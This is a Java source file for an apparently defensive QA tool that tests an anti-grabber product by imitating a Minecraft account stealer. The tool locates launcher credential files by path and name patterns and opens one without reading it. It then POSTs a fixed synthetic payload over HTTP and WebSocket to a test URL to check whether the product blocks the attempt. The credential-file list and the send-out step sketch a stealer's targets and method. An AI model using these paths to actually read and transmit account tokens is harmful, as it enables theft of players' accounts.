// Tester de exfiltração do AntiGrabber — ferramenta de QA, NÃO é o produto.
//
// Simula o passo observável de um grabber de conta SEM ser um stealer: ABRE um arquivo de
// conta de launcher (só o handle, pra o ETW ver a leitura) e NÃO lê byte nenhum do token;
// depois manda um payload SINTÉTICO FIXO por HTTP POST e por WebSocket. Nunca extrai,
// decodifica ou transmite credencial real.
//
// Rodar como jar deixa o processo como java.exe/javaw.exe (code host) — mesma classe de um
// mod de Minecraft. Uso:
//   Serviço OFF (ver payload):  java -jar exfil-test.jar --url http://localhost:3000/exfil --ws ws://localhost:3000
//   Serviço ON  (ver bloqueio): java -jar exfil-test.jar --url https://example.com/
// Alvo HTTPS/443 bloqueado nos dois vetores = PASS.

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.net.http.WebSocket;
import java.nio.channels.FileChannel;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardOpenOption;
import java.time.Duration;
import java.time.Instant;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.CompletionStage;
import java.util.regex.Pattern;

public class ExfilTest {
    static final String PAYLOAD = "TEST_PAYLOAD_NAO_E_TOKEN_REAL|" + Instant.now();

    public static void main(String[] rawArgs) {
        Map<String, String> args = parseArgs(rawArgs);
        String url = args.getOrDefault("url", "https://example.com/");
        String wsUrl = args.getOrDefault("ws", deriveWs(url));
        int timeout = Integer.parseInt(args.getOrDefault("timeout", "8000"));

        System.out.println("=== AntiGrabber exfil-test (QA, payload sintetico) ===");
        System.out.println("Payload: " + PAYLOAD);

        Path account = findAccountFile(args.get("account"));
        if (account != null) {
            // Abre e fecha SEM LER — so pra o ETW registrar a leitura por este PID.
            try (FileChannel ch = FileChannel.open(account, StandardOpenOption.READ)) {
                System.out.println("Arquivo de conta aberto (sem ler conteudo): " + account);
            } catch (Exception e) {
                System.out.println("Nao foi possivel abrir " + account + ": " + e.getMessage());
            }
        } else {
            System.out.println("Nenhum arquivo de conta de launcher encontrado — passe --account=<caminho>.");
            System.out.println("Sem isso, o caminho 'leu conta -> bloqueia qualquer dominio' nao e exercitado.");
        }

        System.out.println("HTTP  -> " + url);
        System.out.println("WS    -> " + wsUrl);
        Result http = sendHttp(url, timeout);
        Result ws = sendWs(wsUrl, timeout);
        System.out.println("[HTTP] " + http.status.toUpperCase() + " — " + http.detail);
        System.out.println("[WS] " + ws.status.toUpperCase() + " — " + ws.detail);

        boolean external = url.toLowerCase().startsWith("https:");
        boolean blocked = http.status.equals("bloqueou") && ws.status.equals("bloqueou");
        if (external) {
            System.out.println(blocked
                ? "PASS — alvo HTTPS/443 bloqueado nos dois vetores."
                : "FAIL — alvo HTTPS/443 nao foi totalmente bloqueado (servico ligado?).");
            System.exit(blocked ? 0 : 1);
        } else {
            boolean sent = http.status.equals("enviou") || ws.status.equals("enviou");
            System.out.println(sent ? "OK — ferramenta enviou (confira o catcher)." : "Nada enviou — catcher no ar?");
            System.exit(0);
        }
    }

    record Result(String status, String detail) {}

    static Result sendHttp(String url, int timeoutMs) {
        try {
            // HTTP/1.1 forcado: no default HTTP/2, o cliente manda Upgrade: h2c em texto claro,
            // que servidores simples roteiam como upgrade. No 443 o bloqueio e no TLS, independe disso.
            HttpClient client = HttpClient.newBuilder()
                .version(HttpClient.Version.HTTP_1_1)
                .connectTimeout(Duration.ofMillis(timeoutMs))
                .build();
            HttpRequest req = HttpRequest.newBuilder(URI.create(url))
                .timeout(Duration.ofMillis(timeoutMs))
                .header("content-type", "text/plain")
                .POST(HttpRequest.BodyPublishers.ofString(PAYLOAD))
                .build();
            HttpResponse<Void> res = client.send(req, HttpResponse.BodyHandlers.discarding());
            return new Result("enviou", "resposta HTTP " + res.statusCode());
        } catch (Exception e) {
            return new Result("bloqueou", e.getClass().getSimpleName() + ": " + e.getMessage());
        }
    }

    static Result sendWs(String wsUrl, int timeoutMs) {
        if (wsUrl == null) return new Result("erro", "ws URL invalida");
        try {
            HttpClient client = HttpClient.newBuilder().connectTimeout(Duration.ofMillis(timeoutMs)).build();
            WebSocket ws = client.newWebSocketBuilder()
                .connectTimeout(Duration.ofMillis(timeoutMs))
                .buildAsync(URI.create(wsUrl), new WebSocket.Listener() {})
                .get();
            ws.sendText(PAYLOAD, true).get();
            ws.sendClose(WebSocket.NORMAL_CLOSURE, "fim").get();
            return new Result("enviou", "upgrade ok, texto enviado");
        } catch (Exception e) {
            Throwable c = e.getCause() != null ? e.getCause() : e;
            // Conectou (TLS ok) mas o destino nao e WebSocket: passou pela REDE, so recusou o
            // upgrade. So conta como bloqueio quando a conexao nem completa (connect/timeout).
            if (c instanceof java.net.http.WebSocketHandshakeException)
                return new Result("enviou", "conectou; destino nao e WebSocket (upgrade recusado)");
            return new Result("bloqueou", c.getClass().getSimpleName() + ": " + c.getMessage());
        }
    }

    static String deriveWs(String httpUrl) {
        try {
            URI u = URI.create(httpUrl);
            String scheme = "https".equalsIgnoreCase(u.getScheme()) ? "wss" : "ws";
            int port = u.getPort();
            return scheme + "://" + u.getHost() + (port > 0 ? ":" + port : "");
        } catch (Exception e) {
            return null;
        }
    }

    static Path findAccountFile(String override) {
        if (override != null) {
            Path p = Path.of(override);
            return Files.exists(p) ? p : null;
        }
        String appData = System.getenv("APPDATA");
        String home = System.getProperty("user.home");
        if (appData == null) appData = home + "\\AppData\\Roaming";
        String[][] dirs = {
            { appData + "\\.minecraft", "^launcher_accounts.*\\.json$" },
            { appData + "\\.minecraft", "^launcher_msa_credentials.*" },
            { appData + "\\.minecraft", "^TlauncherProfiles\\.json$" },
            { appData + "\\PrismLauncher", "^accounts\\.json$" },
            { appData + "\\PolyMC", "^accounts\\.json$" },
            { appData + "\\.feather", "^accounts\\.json$" },
            { home + "\\.lunarclient\\settings\\game", "^accounts\\.json$" },
        };
        for (String[] d : dirs) {
            Path dir = Path.of(d[0]);
            Pattern rx = Pattern.compile(d[1], Pattern.CASE_INSENSITIVE);
            try (var stream = Files.list(dir)) {
                var hit = stream.filter(p -> rx.matcher(p.getFileName().toString()).matches()).findFirst();
                if (hit.isPresent()) return hit.get();
            } catch (Exception ignored) {
            }
        }
        return null;
    }

    // Aceita --chave=valor e --chave valor.
    static Map<String, String> parseArgs(String[] argv) {
        Map<String, String> out = new HashMap<>();
        for (int i = 0; i < argv.length; i++) {
            String a = argv[i];
            if (!a.startsWith("--")) continue;
            int eq = a.indexOf('=');
            if (eq > 0) {
                out.put(a.substring(2, eq), a.substring(eq + 1));
            } else if (i + 1 < argv.length && !argv[i + 1].startsWith("--")) {
                out.put(a.substring(2), argv[++i]);
            } else {
                out.put(a.substring(2), "true");
            }
        }
        return out;
    }
}
